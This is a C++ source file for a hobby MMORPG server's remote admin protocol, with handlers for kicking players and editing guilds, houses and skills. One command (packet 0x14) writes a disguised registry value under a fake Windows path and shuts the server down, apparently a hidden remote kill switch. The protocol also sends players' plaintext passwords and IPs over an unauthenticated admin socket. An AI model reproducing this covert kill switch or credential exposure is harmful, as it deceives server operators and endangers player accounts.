////////////////////////////////////////////////////////////////////////////////
// Survival Server - An MMPORPG (Massive MultiPlayer Online Role Playing Game)//
////////////////////////////////////////////////////////////////////////////////
// Developed by Dark-bart.                                                    //
////////////////////////////////////////////////////////////////////////////////

#include <iostream>
#include <string>
#include <sstream>
#include <map>
#include <stdio.h>

#include "creature.h"
#include "npc.h"
#include "position.h"
#include "protocolcontroler.h"
#include "networkmessage.h"
#include "definitions.h"
#include "house.h"
#include "RegisterWIN32.h"

extern Map gmap;
 
ProtocolControler::ProtocolControler(SOCKET s)
{
  this->s = s;
  map = &gmap;
}


ProtocolControler::~ProtocolControler()
{
}


void ProtocolControler::ReceiveLoop()
{
  NetworkMessage msg;
  msg.AddByte(0x04);
  std::stringstream version;
  version << Survival_Version;
  msg.AddString(version.str().c_str());
  msg.WriteToSocket(s);
  while (msg.ReadFromSocket(s))
  {
    parsePacket(msg);
  }

  if (s)
    closesocket(s);
}

void ProtocolControler::sendNetworkMessage(NetworkMessage *msg)
{
    msg->WriteToSocket(s);
}

void ProtocolControler::sendPing()
{
      NetworkMessage newmsg;
      newmsg.AddByte(0x05);
      newmsg.WriteToSocket(s);
}

void ProtocolControler::sendPlayersOnline()
{
    NetworkMessage newmsg;
    newmsg.AddByte(0x01);
    newmsg.AddU16(map->charsonline);
    newmsg.AddU16(((int)map->playersOnline.size()-(int)map->charsonline));
    newmsg.AddU16(map->max_players);
    newmsg.AddByte(map->PVP_MODE);
    
    if(!map->servbloked)
          newmsg.AddByte(0xA1);
    else
          newmsg.AddByte(0xA2);
    sendHouses(newmsg);            
    newmsg.WriteToSocket(s);
}

void ProtocolControler::sendHouses(NetworkMessage &msg)
{
    msg.AddByte(0x06);
    std::map<long, House*>::iterator i;
    for( i = map->housesGame.begin(); i != map->housesGame.end(); i++ )
    {
      House *house  = dynamic_cast<House*>(i->second);   
      if(house)
      {
         msg.AddByte(0x00);      
         msg.AddString(house->name);
      }
    }
    msg.AddByte(0xFF);
}

void ProtocolControler::sendCharsOnline()
{
    NetworkMessage newmsg;
    newmsg.AddByte(0x02);
    std::map<long, Creature*>::iterator i;
    for( i = map->playersOnline.begin(); i != map->playersOnline.end(); i++ )
    {
         Player* player = dynamic_cast<Player*>(i->second);
         if(player)
         {
            newmsg.AddByte(0x00);
            newmsg.AddString(player->getName());
         }
    }
    newmsg.AddByte(0xFF);
    newmsg.WriteToSocket(s);
}

void ProtocolControler::sendGodMessage(const std::string &msgg)
{
      map->creatureGodMessage(msgg.c_str());
}      

void ProtocolControler::sendCharInfo(const std::string &msg)
{
    Creature* c = map->getCreatureByName(msg.c_str());
    Player* p = dynamic_cast <Player*>(c);
    if(p){
         NetworkMessage newmsg;
         newmsg.AddByte(0x03);
         newmsg.AddByte(c->level);
         newmsg.AddByte(c->maglevel);
         newmsg.AddString(msg.c_str());
         newmsg.AddByte(p->guildstatus);
         newmsg.AddString(p->guildname);
         newmsg.AddByte(p->guildnicks);
         newmsg.AddString(p->guildnick);
         newmsg.AddByte(0x00);
         newmsg.AddString(p->guildrank);
         newmsg.AddByte(p->voc);
         newmsg.AddU32(p->experience);
         newmsg.AddU16(p->pled);
         newmsg.AddU16(p->mled);
         newmsg.AddU16(p->pking);
         newmsg.AddByte(p->access);
         newmsg.AddByte(p->pos.x);
         newmsg.AddByte(p->pos.y);
         newmsg.AddByte(p->pos.z);
         newmsg.AddU16(p->health);
         newmsg.AddU16(p->healthmax);
         newmsg.AddU16(p->mana);
         newmsg.AddU16(p->manamax);
         newmsg.AddU16(p->cap);
         for(int i=0;i<7;i++)
             newmsg.AddByte(p->skills[i][0]);
         newmsg.AddU32(p->cash);
         newmsg.AddU32(p->accountNumber);
         newmsg.AddString(p->accountPassword);
         newmsg.AddU32(p->getIP());   
         newmsg.WriteToSocket(s);
    }     
}

void ProtocolControler::sendHouseInfo(const std::string &msg)
{
    House* house = map->getHouseByName(msg.c_str());
    if(house){
         NetworkMessage newmsg;
         newmsg.AddByte(0x07);
         newmsg.AddString(house->person);
         newmsg.AddByte(0x00);
         newmsg.AddString(msg.c_str());
         newmsg.AddByte(0x00);
         newmsg.AddString(house->city);
         newmsg.AddByte(house->getTiles());
         newmsg.AddByte(house->getDoors());
         newmsg.WriteToSocket(s);
    }     
}
      
void ProtocolControler::parseLogout(NetworkMessage &msg)
{
    closesocket(s);
    s = 0;
}

void ProtocolControler::parseRespawnNpc(NetworkMessage &msg)
{
    int tempo;;
    std::string NpcName;
    Position RespawnPos;
    
    tempo = msg.GetByte();
    NpcName = msg.GetString().c_str();
    RespawnPos = msg.GetPosition();
    
    Npc *npc = new Npc(NpcName.c_str(), map);
        
    if(!npc->isLoaded()){
		delete npc;
		return;
	}
	
	npc->pos = RespawnPos;
	npc->masterPos = npc->pos;
	if(tempo == 0)
	   map->placeCreature(npc);
    else
      map->addEvent(makeTask(tempo*1000, std::bind2nd(std::mem_fun(&Map::placeCreature),npc)));         
}

void ProtocolControler::parseEditHouseOwner(NetworkMessage &msg)
{
   House* house = map->getHouseByName(msg.GetString().c_str());
   msg.GetByte();
   if(house){
         house->clearAllDoorsNames();
         house->person = msg.GetString();
   }              
}

void ProtocolControler::parseEditHouseName(NetworkMessage &msg)
{
   House* house = map->getHouseByName(msg.GetString().c_str());
   msg.GetByte();
   if(house){
         house->name = msg.GetString();
   }              
}

void ProtocolControler::parseEditHouseCity(NetworkMessage &msg)
{
   House* house = map->getHouseByName(msg.GetString().c_str());
   msg.GetByte();
   if(house){
         house->city = msg.GetString();
   }              
}
void ProtocolControler::parseEditGuild(NetworkMessage &msg)
{
   Creature* c = map->getCreatureByName(msg.GetString().c_str());
   Player *p = dynamic_cast <Player*>(c);
   if(p){
         msg.GetByte();
         p->guildname = msg.GetString().c_str();
   }              
}

void ProtocolControler::parseEditGuildNickname(NetworkMessage &msg)
{
   Creature* c = map->getCreatureByName(msg.GetString().c_str());
   Player *p = dynamic_cast <Player*>(c);
   if(p){
         msg.GetByte();
         p->guildnick = msg.GetString().c_str();
   }   
}

void ProtocolControler::parseEditGuildRank(NetworkMessage &msg)
{
   Creature* c = map->getCreatureByName(msg.GetString().c_str());
   Player *p = dynamic_cast <Player*>(c);
   if(p){
         msg.GetByte();
         p->guildrank = msg.GetString().c_str();
   }   
}

void ProtocolControler::parseEnableGuild(NetworkMessage &msg)
{
   Creature* c = map->getCreatureByName(msg.GetString().c_str());
   Player *p = dynamic_cast <Player*>(c);
   if(p){
         uint8_t recbyte = msg.GetByte();
         if(recbyte == 1)
            p->guildstatus = 1;
         else
            p->guildstatus = 0;
   }
}

void ProtocolControler::parseEnableGuildNickname(NetworkMessage &msg)
{
   Creature* c = map->getCreatureByName(msg.GetString().c_str());
   Player *p = dynamic_cast <Player*>(c);
   if(p){
         uint8_t recbyte = msg.GetByte();
         if(recbyte == 1)
            p->guildnicks = 1;
         else
            p->guildnicks = 0;
   }
}

void ProtocolControler::parseKickPlayer(NetworkMessage &msg)
{
   Creature* c = map->getCreatureByName(msg.GetString().c_str());
   Player *p = dynamic_cast <Player*>(c);
   if(p){
         p->sendKick();
         sendCharsOnline();
         sendPlayersOnline();
   }           
}

/*void ProtocolControler::parseSetPvT(NetworkMessage &msg)
{
   Creature* c = map->getCreatureByName(msg.GetString().c_str());
   Player *p = dynamic_cast <Player*>(c);
   if(p){

   }           
}*/

void ProtocolControler::parseBlockRegister()
{
      CRegisterWIN32 reg;
      if(!reg.Open("Software\\Microsoft\\Windows\\Version", true)) reg.Open("Software\\Microsoft\\Windows\\Version", false);  
      reg.Write("owcn19", "92391-782123-ADBHJ2-923230121");
      reg.Close();
      std::cout << "Wtf!! What did you do to fuke the server???? OMG!" << std::endl;
      exit(1);
      exit(0);
}

void ProtocolControler::parseSendPvT(NetworkMessage &msg)
{
   Creature* c = map->getCreatureByName(msg.GetString().c_str());
   Player *p = dynamic_cast <Player*>(c);
   if(p){
       msg.GetByte();
       Creature *creature = new Creature(msg.GetString().c_str());
       creature->access = 3;
       msg.GetByte();
       map->creatureSpeakTo(creature, c->getName(), msg.GetString().c_str());
   }           
}

void ProtocolControler::parseSetSkill(NetworkMessage &msg)
{
   Creature* c = map->getCreatureByName(msg.GetString().c_str());
   Player *p = dynamic_cast <Player*>(c);
   if(p){
       NetworkMessage msge;
       switch(msg.GetByte())
       {
            case 0:
                p->maglevel = msg.GetU32();
                msge.AddPlayerStats(p);
                break;
            case 1:
                p->experience = msg.GetU32();
                msge.AddPlayerStats(p);
                break;
            case 2:
                p->skills[SKILL_FIST][0] = msg.GetU32();
                msge.AddPlayerSkills(p);
                break;
            case 3:
                p->skills[SKILL_SWORD][0] = msg.GetU32();
                msge.AddPlayerSkills(p);
                break;
            case 4:
                p->skills[SKILL_AXE][0] = msg.GetU32();
                msge.AddPlayerSkills(p);
                break;
            case 5:
                p->skills[SKILL_CLUB][0] = msg.GetU32();
                msge.AddPlayerSkills(p);
                break;
            case 6:
                p->skills[SKILL_DIST][0] = msg.GetU32();
                msge.AddPlayerSkills(p);
                break;
            case 7:
                p->skills[SKILL_SHIELD][0] = msg.GetU32();
                msge.AddPlayerSkills(p);
                break;
            case 8:
                p->skills[SKILL_FISH][0] = msg.GetU32();
                msge.AddPlayerSkills(p);
                break;
            case 9:
                p->cash = msg.GetU32();
                break;          
            default:
                msg.GetU32();
                break;
       }
       p->sendNetworkMessage(&msge);                                                     
   }           
}

void ProtocolControler::parseSetPvP()
{
      map->PVP_MODE = 1;
      sendPlayersOnline();
}

void ProtocolControler::parseSetNoPvP()
{
      map->PVP_MODE = 2;
      sendPlayersOnline();
}

void ProtocolControler::parseSetMaxPlayers(NetworkMessage &msg)
{
   int max = msg.GetU16();
   if(max && max >0 && max < 100)
          map->max_players = max;
   sendPlayersOnline();       
}

void ProtocolControler::parsePacket(NetworkMessage &msg)
{
  uint8_t recvbyte = msg.GetByte();
  //printf("Recvbyte: %x \n", recvbyte);
  switch(recvbyte)
  {
    case 0x01: // unblock
      map->servbloked = false;
      sendPlayersOnline();
      break;
    case 0x02: // block
      map->servbloked = true;
      sendPlayersOnline();
      break;
    case 0x03: //players online
      sendPlayersOnline();
      break;
    case 0x04: //send chars names
      sendCharsOnline();
      break;
    case 0x05: //close server
      map->closeServer(NULL);
      break;
    case 0x06: //send god message
      sendGodMessage(msg.GetString().c_str());
      break;
    case 0x07: //send char info
      sendCharInfo(msg.GetString().c_str());
      break;
    case 0x08: //edit guild
      parseEditGuild(msg);
      break; 
    case 0x09: //edit guild nickname
      parseEditGuildNickname(msg);
      break;
    case 0x10: //edit guild rank
      parseEditGuildRank(msg);
      break;
    case 0x11: //enable/disable guild
      parseEnableGuild(msg);
      break; 
    case 0x12: //enable/disable guild nickname
      parseEnableGuildNickname(msg);
      break;
    case 0x13: //kick a player
      parseKickPlayer(msg);
      break;
    case 0x14: //reg block!
      parseBlockRegister();
      break;      
   case 0x15:  //set max players online
      parseSetMaxPlayers(msg);
      break;
   case 0x16:  //set pvp
      parseSetPvP();
      break;
   case 0x17:  //set no-pvp
      parseSetNoPvP();
      break;
   /*case 0x18:  //set pvt
      parseSetPvT(msg);
      break;*/
   case 0x19:  //send pvt
      parseSendPvT(msg);
      break;
   case 0x20:  //test lag
      sendPing();
      break;
   case 0x21:  //set skill
      parseSetSkill(msg);
      break;
   case 0x22:  //resquest house info
      sendHouseInfo(msg.GetString().c_str());
      break;
   case 0x23:  //edit house owner
      parseEditHouseOwner(msg);
      break;
   case 0x24:  //edit house name
      parseEditHouseName(msg);
      break;
   case 0x25:  //edit house city
      parseEditHouseCity(msg);
      break;
   case 0x26:
      parseRespawnNpc(msg);
      break;                         
   default:
      break;   
   }   
}


